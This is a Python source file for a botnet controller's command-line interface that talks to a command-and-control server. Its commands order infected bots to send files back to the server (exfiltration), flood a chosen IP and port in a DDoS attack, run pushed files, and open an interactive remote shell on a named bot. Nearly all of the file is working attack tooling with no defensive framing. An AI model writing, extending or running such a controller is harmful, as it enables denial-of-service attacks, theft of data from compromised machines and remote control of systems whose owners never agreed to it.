import cmd
import json
import os
import requests
import asyncio
from websockets.sync.client import connect


# URL del bot server
url = 'http://localhost:3000/'


class BotMasterCLI(cmd.Cmd):
    intro = 'Welcome to BotMasterCLI. Type "help" for available commands.'

    def __init__(self):

        self.prompt = '>> '
        super().__init__()
        self.current_directory = os.getcwd()
        self.command_id = 1

    def do_list(self, line):
        """List files and directories in the current directory."""
        files_and_dirs = os.listdir(self.current_directory)
        for item in files_and_dirs:
            print(item)

    def do_change_dir(self, directory):
        """Change the current directory."""
        new_dir = os.path.join(self.current_directory, directory)
        if os.path.exists(new_dir) and os.path.isdir(new_dir):
            self.current_directory = new_dir
            print(f"Current directory changed to {self.current_directory}")
        else:
            print(f"Directory '{directory}' does not exist.")

    def do_read_file(self, filename):
        """Read the contents of a text file in the current directory."""
        file_path = os.path.join(self.current_directory, filename)
        try:
            with open(file_path, 'r') as existing_file:
                print(existing_file.read())
        except FileNotFoundError:
            print(f"File '{filename}' not found.")
        except Exception as e:
            print(f"Error: {e}")

    def do_download(self, args):
        """Download a file from the bot to the server (Args: filepath, name, objective(default All))"""
        args_vec = parse_args(args)
        if len(args_vec) < 2:
            print("Usage: download filepath, name, objective(default All)")
        else:
            if len(args_vec) == 3:
                body = {
                    'id': self.command_id,
                    'command': "Download",
                    'filepath': args_vec[0],
                    'objective': args_vec[2],
                    'name': args_vec[1]
                }
                send_command(body)
            else:
                body = {
                    'id': self.command_id,
                    'command': "Download",
                    'filepath': args_vec[0],
                    'objective': "All",
                    'name': args_vec[1]
                }
                send_command(body)



    def do_ddos(self, args):
        """DDoS a target IP(Args: ip, port, time(in seconds), objective(default All)"""
        args_vec = parse_args(args)
        if len(args_vec) < 3:
            print("Usage: ddos ip, port, time(in seconds), objective(default All)")
        else:
            if len(args_vec) == 4:
                body = {
                    'id': self.command_id,
                    'command': "DDoS",
                    'ip': args_vec[0],
                    'objective': args_vec[3],
                    'port': args_vec[1],
                    'time': args_vec[2]
                }
                send_command(body)
            else:
                body = {
                    'id': self.command_id,
                    'command': "DDoS",
                    'ip': args_vec[0],
                    'objective': "All",
                    'port': args_vec[1],
                    'time': args_vec[2]
                }
                send_command(body)


    def do_exec(self, args):
        """Send a file to execute in the bots(Args: filename, objective(default All)"""
        args_vec = parse_args(args)
        if len(args_vec) < 1:
            print("Usage: exec filename, objective(default All)")
        else:
            filename = args_vec[0]
            file_path = os.path.join(self.current_directory, filename)
            try:
                with open(file_path, 'r') as existing_file:
                    data = existing_file.read()
                    body = {
                        'id': self.command_id,
                        'command': "Exec",
                        'name': args_vec[0],
                        'objective': "All",
                        'data': data
                    }
                    send_command(body)
                    if len(args_vec) == 2:
                        body = {
                            'id': self.command_id,
                            'command': "Exec",
                            'name': args_vec[0],
                            'objective': args_vec[1],
                            'data': data
                        }
                        send_command(body)
                    else:
                        body = {
                            'id': self.command_id,
                            'command': "Exec",
                            'name': args_vec[0],
                            'objective': "All",
                            'data': data
                        }
                        send_command(body)


            except FileNotFoundError:
                print(f"File '{filename}' not found.")
            except Exception as e:
                print(f"Error: {e}")

    def do_bots(self, args):
        """Query for all the bots connected to the server"""
        
        response = requests.get(url + "/bots")
        print(response.json())

    def do_download_from_server(self, args):
        """Download a file from the server (Args: objective, filename)"""
        args_vec = parse_args(args)
        if len(args_vec) < 2:
            print("Usage: download_from_server objective, filename")
        else:
            objective = args_vec[0]
            filename = args_vec[1]
            response = requests.get(url + f"/download?objective={objective}&filename={filename}")
            print(response.json())
            directory = f"downloads"
            try:
                os.makedirs(directory, exist_ok=True)
                with open(directory + "/" + filename, 'w') as file:
                    file.write(response.json()["data"])
            except Exception as e:
                print(f"An error occurred: {e}")

    def do_shell(self, args):
        """Create a shell in a bot (Args: objective)"""
        args_vec = parse_args(args)
        if len(args_vec) < 1:
            print("Usage: shell botname")
        else:
            with connect("ws://localhost:8080") as websocket:
                print(f"({args_vec[0]})>> Type quit to exit")
                # Loop indefinitely
                while True:
                    # Ask for user input
                    user_input = input(f"({args_vec[0]})>> ")

                    # Check if the user wants to quit
                    if user_input.lower() == 'quit':
                        print("Exiting the loop.")
                        break

                    data = {
                        'id': self.command_id,
                        'sh_cmd': user_input,
                        'objective': args_vec[0]
                    }
                    json_data = json.dumps(data)

                    websocket.send(json_data)
                    message = websocket.recv()
                    print(message)
                    # string_data = message.decode('utf-8')
                    # print(string_data)





    def do_quit(self, line):
        """Exit the CLI."""
        return True

    def postcmd(self, stop, line):
        print()  # Add an empty line for better readability
        return stop


def parse_args(args):
    return args.split()


def send_command(body):
    json_payload = json.dumps(body)
    response = requests.post(url + "/send-command", data=json_payload)
    if response.status_code == 200:
        print("Request was successful")
        print("Response:", response.json())
    else:
        print("Request failed")
        print("Status code:", response.status_code)
        print("Response:", response.text)


if __name__ == '__main__':
    BotMasterCLI().cmdloop()
